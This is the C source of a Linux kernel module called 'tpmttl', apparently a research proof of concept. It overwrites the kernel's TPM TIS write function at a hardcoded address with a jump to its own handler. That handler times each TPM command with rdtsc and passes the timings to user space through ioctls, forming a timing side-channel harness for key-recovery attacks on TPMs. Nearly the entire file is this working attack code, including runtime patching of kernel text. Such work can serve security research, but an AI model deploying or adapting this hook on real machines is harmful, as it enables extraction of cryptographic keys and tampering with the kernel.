#include <linux/module.h>
#include <linux/miscdevice.h>
#include <linux/uaccess.h>
#include <linux/io.h>
#include <linux/fs.h>
#include <linux/tpm.h>

#include "../tpmttl.h"


unsigned long long ptpm_tcg_write_bytes = 0xffffffff81b2ef10;

unsigned char nop_stub[] = {0x90, 0x90, 0x90, 0x90, 0x90};
unsigned char jmp_stub[] = {0xe9, 0xf1, 0xf2, 0xf3, 0xf4};

enum tis_status {
	TPM_STS_VALID = 0x80,
	TPM_STS_COMMAND_READY = 0x40,
	TPM_STS_GO = 0x20,
	TPM_STS_DATA_AVAIL = 0x10,
	TPM_STS_DATA_EXPECT = 0x08,
	TPM_STS_RESPONSE_RETRY = 0x02,
	TPM_STS_READ_ZERO = 0x23,
};

enum tpm_tis_io_mode {
	TPM_TIS_PHYS_8,
	TPM_TIS_PHYS_16,
	TPM_TIS_PHYS_32,
};

struct tpm_tis_phy_ops {
	int (*read_bytes)(struct tpm_tis_data *data, u32 addr, u16 len,
			  u8 *result, enum tpm_tis_io_mode mode);
	int (*write_bytes)(struct tpm_tis_data *data, u32 addr, u16 len,
			   const u8 *value, enum tpm_tis_io_mode mode);
	int (*verify_crc)(struct tpm_tis_data *data, size_t len,
			  const u8 *value);
};

struct tpm_tis_data {
	struct tpm_chip *chip;
	u16 manufacturer_id;
	struct mutex locality_count_mutex;
	unsigned int locality_count;
	int locality;
	int irq;
	struct work_struct free_irq_work;
	unsigned long last_unhandled_irq;
	unsigned int unhandled_irqs;
	unsigned int int_mask;
	unsigned long flags;
	void __iomem *ilb_base_addr;
	u16 clkrun_enabled;
	wait_queue_head_t int_queue;
	wait_queue_head_t read_queue;
	const struct tpm_tis_phy_ops *phy_ops;
	unsigned short rng_quality;
	unsigned int timeout_min;
	unsigned int timeout_max;
};

struct tpm_tis_tcg_phy {
	struct tpm_tis_data priv;
	void __iomem *iobase;
};

#define	TPM_STS(l)			(0x0018 | ((l) << 12))

#ifdef CONFIG_PREEMPT_RT
static inline void tpm_tis_flush(void __iomem *iobase)
{
	ioread8(iobase + TPM_ACCESS(0));
}
#else
#define tpm_tis_flush(iobase) do { } while (0)
#endif

static inline void tpm_tis_iowrite8(u8 b, void __iomem *iobase, u32 addr)
{
	iowrite8(b, iobase + addr);
	tpm_tis_flush(iobase);
}


static noinline int internal_tpm_tcg_write_bytes_handler(struct tpm_tis_data *data, u32 addr, u16 len, const u8 *value, enum tpm_tis_io_mode io_mode);
static int tpm_tcg_write_bytes_handler(struct tpm_tis_data *data, u32 addr, u16 len, const u8 *value, enum tpm_tis_io_mode io_mode);

unsigned long long tscrequest[1000] = {0};
unsigned long long requestcnt = 0;

static void enable_attack_stub()
{
  requestcnt = 0;
  unsigned int target_addr;

  // write_cr0(read_cr0() & (~X86_CR0_WP));

  target_addr = tpm_tcg_write_bytes_handler - ptpm_tcg_write_bytes - 5;  
  jmp_stub[1] = ((char*)&target_addr)[0];
  jmp_stub[2] = ((char*)&target_addr)[1];
  jmp_stub[3] = ((char*)&target_addr)[2];
  jmp_stub[4] = ((char*)&target_addr)[3];
  memcpy((void*)ptpm_tcg_write_bytes, jmp_stub, sizeof(jmp_stub));

  // write_cr0(read_cr0() | X86_CR0_WP); 

  printk("TPMTTL: ENABLED\n");
}


static void disable_attack_stub()
{  
  // write_cr0(read_cr0() & (~X86_CR0_WP));

  memcpy((void*)ptpm_tcg_write_bytes, nop_stub, sizeof(nop_stub));

  // write_cr0(read_cr0() | X86_CR0_WP); 

  printk("TPMTTL: DISABLED\n");
}


static long ioctl_uninstall_timer(struct file *filep, unsigned int cmd, unsigned long arg)
{
  disable_attack_stub();
  return 0;
}


static long ioctl_install_timer(struct file *filep, unsigned int cmd, unsigned long arg)
{
  enable_attack_stub();
  return 0;
}


static long ioctl_read(struct file *filep, unsigned int cmd, unsigned long arg)
{
  struct tpmttl_generic_param * param;
  param = (struct tpmttl_generic_param *) arg;
  memcpy(param->ttls, tscrequest, 1000 * sizeof(unsigned long long));
  param->cnt = requestcnt;

  printk(KERN_ALERT "TPMTTL: requestcnt %lu\n", requestcnt);
  requestcnt = 0;

  return 0;
}


typedef long (*tpmttl_ioctl_t)(struct file *filep, unsigned int cmd, unsigned long arg);

long tpmttl_ioctl(struct file *filep, unsigned int cmd, unsigned long arg)
{
  struct tpmttl_generic_param data;
  long ret;
  
  tpmttl_ioctl_t handler = NULL;

  switch (cmd) {    
    case TPMTTL_IOCTL_UNINSTALL_TIMER:
      handler = ioctl_uninstall_timer;
      break;	
    case TPMTTL_IOCTL_INSTALL_TIMER:
      handler = ioctl_install_timer;
      break;	
    case TPMTTL_IOCTL_READ:
      handler = ioctl_read;
      break;  
    default:
      return -EINVAL;
  }
  
  if (copy_from_user(&data, (void __user *) arg, _IOC_SIZE(cmd)))
    return -EFAULT;

  ret = handler(filep, cmd, (unsigned long) ((void *) &data));

  if (!ret && (cmd & IOC_OUT)) {
    if (copy_to_user((void __user *) arg, &data, _IOC_SIZE(cmd)))
      return -EFAULT;
  }
  return ret;
}


static noinline int internal_tpm_tcg_write_bytes_handler(struct tpm_tis_data *data, u32 addr, u16 len, const u8 *value, enum tpm_tis_io_mode io_mode)
{
  unsigned long t;
  struct tpm_tis_tcg_phy *phy = container_of(data, struct tpm_tis_tcg_phy, priv);

  if (len == 1 && *value == TPM_STS_GO && TPM_STS(data->locality) == addr) {
    wmb();
    t = rdtsc();
    rmb();
    tpm_tis_iowrite8(*value, phy->iobase, addr);

    while (!(ioread8(phy->iobase + addr) & TPM_STS_DATA_AVAIL));

    rmb();

    tscrequest[requestcnt++] = rdtsc() - t;
  } else {
    while (len--)
      tpm_tis_iowrite8(*value++, phy->iobase, addr);
  }

  return 0;
}


static int tpm_tcg_write_bytes_handler(struct tpm_tis_data *data, u32 addr, u16 len, const u8 *value, enum tpm_tis_io_mode io_mode)
{
  return internal_tpm_tcg_write_bytes_handler(data, addr, len, value, io_mode);
}


static const struct file_operations tpmttl_fops = {
  .owner = THIS_MODULE,
  .unlocked_ioctl = tpmttl_ioctl,
};

static struct miscdevice tpmttl_miscdev = {
  .minor = MISC_DYNAMIC_MINOR,
  .name = "tpmttl",
  .fops = &tpmttl_fops,
};


static int tpmttl_init(void)
{
  int ret;
  printk(KERN_ALERT "TPMTTL: HELLO\n");

  ret = misc_register(&tpmttl_miscdev);
  if (ret) {
    printk(KERN_ERR "cannot register miscdev(err=%d)\n", ret);
    return ret;
  }

  return 0;
}


static void tpmttl_exit(void)
{ 
  disable_attack_stub();
  misc_deregister(&tpmttl_miscdev);  

  printk(KERN_ALERT "TPMTTL: BYE\n");
}


module_init(tpmttl_init);
module_exit(tpmttl_exit);
MODULE_LICENSE("GPL");
